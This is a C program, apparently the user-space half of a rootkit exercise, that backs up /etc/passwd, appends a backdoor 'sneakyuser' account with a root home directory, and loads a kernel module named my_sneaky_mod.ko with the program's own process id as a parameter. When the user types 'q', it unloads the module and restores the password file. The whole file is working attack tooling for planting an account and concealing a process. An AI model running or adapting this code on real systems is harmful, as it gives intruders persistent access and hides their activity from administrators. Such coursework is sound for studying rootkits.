#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <string.h>

int main(){
  
  pid_t sneaky_pid = getpid();
  
  printf("sneaky_process pid=%d\n",sneaky_pid);
  char copy[64]="/bin/cp /etc/passwd /tmp/passwd";
  
  int res=system(copy);
  if(res!=0){
    perror("Error: Error copying passwd file\n");
    exit(EXIT_FAILURE);
  }

  /* STEP */
  puts("FILE COPPIED\n");
  
  FILE * ori=fopen("/etc/passwd","a");
  if(ori==NULL){
    perror("Error: Error opening passwd file\n");
   exit(EXIT_FAILURE);
  }
  
  char add[]="sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
  int f1=fprintf(ori,"%s\n",add);
  if(f1<0){
    perror("Error: Error adding new line to passwd\n");
    exit(EXIT_FAILURE);
  }

  /* STEP */
  puts("USER ADDED\n");

  fclose(ori);
  
  pid_t pid1=fork();
  
  if(pid1==-1){
    perror("ERROR: Error while forking");
    exit(EXIT_FAILURE);
  }
  
  if(pid1==0){
    
    
    /*   char buf[100];
    strcat(buf,"sneaky_pid=");
    char str_pid[32];
    sprintf(str_pid,"%d\n",sneaky_pid);
    strcat(buf, str_pid);
    //strcat(buf, "\"");
    printf("buf : %s\n",buf);
    int res1;
    char load_module[256]="insmod my_sneaky_mod.ko ";
    strcat(load_module, buf);
    */
    char load_module[256];
    sprintf(load_module,"insmod my_sneaky_mod.ko \"sneaky_pid=%d\"", sneaky_pid);
    printf("%s\n", load_module);
    int res1=system(load_module);
    printf("insmod exit number = %d\n", res1);
    if(res1!=0){
    perror("Error: Error loading module");
    }
    exit(EXIT_SUCCESS);
  } else{
    int status;
    pid_t endid1 = wait(&status);
    if(endid1==-1){
      perror("Error: Error waiting for child");
      exit(EXIT_FAILURE);
    }
    puts("ABOUT TO GET IN THE LOOP");
    while(getchar()!='q'){
    }
    puts("EXITED THE LOOP");
    //    pid_t pid2;
    //pid2=fork();
    /*if(pid2==-1){
      perror("Error: Error forking");
      exit(EXIT_FAILURE);
    }
    if(pid2==0){
    */	
    char unload_module[64]="rmmod my_sneaky_mod";
    int res3=system(unload_module);
    printf("1\n");
    if(res3!=0)
      {
        perror("Error: Error unloading module ");
      }
    /*      exit(EXIT_SUCCESS);
	    }
	    else{
	    printf("2\n");
	    pid_t endid2;
	    printf("3\n");
	    endid2=wait(&status);
	    printf("4\n");
	    if(endid2==-1){
	    perror("Error waiting child");
	    exit(EXIT_FAILURE);
	    }
    */
    printf("5\n");
    char copy_back[64]="/bin/cp /tmp/passwd /etc/passwd; rm /tmp/passwd";
    printf("6\n");
    int res4=system(copy_back);
    if(res4!=0){
      perror("Error: Error copying back ");
    }
  }
  
  exit(EXIT_SUCCESS);
}


    
  
  
